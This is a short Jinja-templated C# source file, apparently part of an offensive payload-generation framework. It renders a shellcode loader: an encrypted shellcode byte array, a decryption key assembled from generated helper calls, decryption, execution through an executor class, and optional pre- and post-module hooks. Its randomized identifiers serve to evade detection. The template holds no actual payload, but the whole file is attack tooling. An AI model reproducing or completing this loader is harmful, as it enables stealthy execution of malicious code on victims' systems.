public class {{ special['class_name'] }}
{
    public static void {{ func_name }}()
    {

        byte[] {{ v['shellcode'] }} = {{ special['shellcode'] }};


        string {{ v['dkey_str'] }} = "";


		{% for dkey in special['dkey_calls'] %}
        {{ v['dkey_str'] }} += {{ dkey }}();
		{% endfor %}
		
		{% for pre in special['premodule_calls'] %}
		{{ pre }}();
		{% endfor %}
        byte[] {{ v['dkey'] }} = Encoding.ASCII.GetBytes({{ v['dkey_str'] }});

        {{ v['shellcode'] }} = {{ special['decrypter_class_name'] }}.{{ special['decrypter_func'] }}({{ v['shellcode'] }}, {{ v['dkey'] }});

        {{ special['executor_class_name'] }}.{{ special['executor_func'] }}({{ v['shellcode'] }});

		{% for post in special['postmodule_calls'] %}
		{{ post }}();
		{% endfor %}

        return;
    }
}
